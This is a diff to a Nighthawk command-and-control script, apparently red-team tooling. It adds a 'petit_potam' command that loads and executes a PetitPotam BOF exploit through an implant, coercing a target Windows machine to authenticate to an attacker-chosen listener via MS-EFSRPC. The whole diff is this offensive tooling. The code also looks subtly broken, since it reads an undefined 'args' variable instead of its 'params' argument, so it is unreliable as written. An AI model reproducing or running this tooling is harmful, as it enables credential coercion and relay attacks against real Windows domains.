@@ -1042,3 +1042,54 @@ nighthawk.register_command(
 )
 
 # endregion
+
+# region PetitPotam
+
+def petit_potam(params, info):
+    """
+    Coerce authentication from the target machine to listener machine via the PetitPotam vulnerability.
+    """
+
+    if len(args) < 2:
+        nighthawk.console_write(CONSOLE_ERROR, "Usage: petit_potam <targetMachine> <listenerMachine>")
+        return False
+
+    target_machine = args[0]
+    listener_machine = args[1]
+    packer = Packer()
+    packer.addstr(target_machine)
+    packer.addstr(listener_machine)
+    packed_params = packer.getbuffer()
+
+    if type(packed_params) != bytes:
+        return False
+
+    with open(nighthawk.script_resource(f"bin/Exploit/PetitPotam/PetitPotam.{info.Agent.ProcessArch}.o"), 'rb') as f:
+        bof = f.read()
+    nighthawk.console_write(CONSOLE_INFO, "executing PetitPotam BOF")
+    api.execute_bof(
+        f"PetitPotam.{info.Agent.ProcessArch}.o",
+        bof,
+        packed_params,
+        "go",
+        False,
+        0,
+        True,
+        "",
+        show_in_console=True
+    )
+
+nighthawk.register_command(
+    petit_potam,
+    "petit_potam",
+    "BOF - Coerce authentication from the target machine to listener machine via the PetitPotam vulnerability. (avantguard script)",
+    "BOF - Coerce authentication from the target machine to listener machine via the PetitPotam vulnerability. (avantguard script)",
+    """petit_potam
+    Summary: Coerce authentication from the target machine to listener machine via MS-EFSRPC EfsRpcOpenFileRaw.
+    Usage: petit_potam <targetMachine> <listenerMachine>
+    
+    THIS IS AN AVANTGUARD SCRIPT""",
+    "petit_potam"
+)
+
+# endregion
